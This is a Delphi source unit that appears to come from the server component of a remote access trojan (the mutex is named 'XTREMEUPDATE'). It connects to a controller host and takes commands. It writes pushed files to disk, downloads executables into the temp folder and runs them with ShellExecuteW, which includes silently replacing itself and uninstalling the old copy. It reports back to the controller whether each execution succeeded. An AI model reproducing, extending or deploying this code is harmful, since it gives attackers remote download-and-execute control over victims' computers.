unit UnitUpload;

interface

procedure NewUpload(xHost: ansistring; xPort: integer; xFileName: widestring; xFileSize: int64; xCommand: widestring);

implementation

uses
  UnitConexao,
  SysUtils,
  UnitFuncoesDiversas,
  UnitConfigs,
  UnitConstantes,
  IdIOHandler,
  IdContext,
  IdTCPClient,
  IdGlobal,
  Windows,
  StrUtils,
  Classes,
  ShellApi,
  GlobalVars,
  UnitCompressString;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function GetFileSize(fname: widestring): int64;
var
  myfile: TFileStream;
begin
  result := 0;
  if FileExists(pwidechar(fname)) = false then exit;
  myFile := TFileStream.Create(fname, fmOpenRead + fmShareDenyNone);
  try
    result := myFile.Size;
    finally
    myFile.free;
  end;
end;

procedure NewUpload(xHost: ansistring; xPort: integer; xFileName: widestring; xFileSize: int64; xCommand: widestring);
var
  IdTCPClient1: TIdTCPClientNew;
  AStream: TFileStream;
  Recebido: widestring;
  Resultado: boolean;
  TempStr: Widestring;
  TempMutex: Cardinal;
  FinalizarConexao: boolean;
begin
  IdTCPClient1 := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);
  FinalizarConexao := False;
  try
    IdTCPClient1.Host := xHost;
    IdTCPClient1.Port := xPort;
    try
      try
        IdTCPClient1.Connect;

        if IdTCPClient1.Connected then
        IdTCPClient1.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);

        while (IdTCPClient1.Connected) and (FinalizarConexao = false) do
        begin
          Recebido := IdTCPClient1.ReceberString;

          if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = MAININFO then
          begin
            IdTCPClient1.EnviarString(xCommand);
          end else

          if Recebido = FMUPLOAD then
          begin
            AStream := TFileStream.Create(xFileName, fmCreate);
            try
              IdTCPClient1.IOHandler.LargeStream := True;
              IdTCPClient1.IOHandler.ReadStream(AStream, xFileSize, False);
              finally
              FreeAndNil(AStream);
            end;
            FinalizarConexao := True;
          end else

          if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPDATESERVERLOCAL then
          begin
            delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
            delete(Recebido, 1, length(DelimitadorComandos));

            xFileSize := StrToInt(Recebido);

            Randomize;
            xFileName := MyTempFolder + IntToStr(Random(99999)) + '.exe';

            AStream := TFileStream.Create(xFileName, fmCreate);
            try
              IdTCPClient1.IOHandler.LargeStream := True;
              IdTCPClient1.IOHandler.ReadStream(AStream, xFilesize, False);
              finally
              FreeAndNil(AStream);
            end;
            Resultado := (FileExists(pWideChar(xFileName)) = True) and (GetFileSize(xFileName) = xFileSize);

            if Resultado = True then
            begin
              TempMutex := CreateMutexW(nil, False, 'XTREMEUPDATE');
              if ShellExecuteW(0, 'open', pWideChar(xFileName), nil, nil, SW_NORMAL) > 32 then
              IniciarDesinstalacao := True else CloseHandle(TempMutex);

              FinalizarConexao := True;
            end;
          end else

          if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPLOADANDEXECUTE then
          begin
            delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
            delete(Recebido, 1, length(DelimitadorComandos));

            TempStr := copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
            delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
            delete(Recebido, 1, length(DelimitadorComandos));

            xFileSize := StrToInt(Recebido);

            Randomize;
            xFileName := MyTempFolder + IntToStr(Random(99999)) + TempStr;

            AStream := TFileStream.Create(xFileName, fmCreate);
            try
              IdTCPClient1.IOHandler.LargeStream := True;
              IdTCPClient1.IOHandler.ReadStream(AStream, xFilesize, False);
              finally
              FreeAndNil(AStream);
            end;
            Resultado := (FileExists(pWideChar(xFileName)) = True) and (GetFileSize(xFileName) = xFileSize);

            if Resultado = True then
            begin
              if ShellExecuteW(0, 'open', pWideChar(xFileName), nil, nil, SW_NORMAL) > 32 then
              begin
                //deu certo....
                TempStr :=
                  UPLOADANDEXECUTEYES + '|' + TempStr;
                  GlobalVars.MainIdTCPClient.EnviarString(TempStr);
              end else
              begin
                //deu errado....
                TempStr :=
                  UPLOADANDEXECUTENO + '|' + TempStr;
                  GlobalVars.MainIdTCPClient.EnviarString(TempStr);
              end;
              FinalizarConexao := True;
            end;
          end else









          if Recebido <> '' then MessageBoxW(0, pwChar(Recebido), '', 0);
          sleep(10);
        end;
        finally
        IdTCPClient1.Disconnect;
      end;
      except // Failed during transfer
    end;
    except // Couldn't even connect
  end;

  IdTCPClient1.OnConnected := nil;

  FreeAndNil(IdTCPClient1);
end;

end.
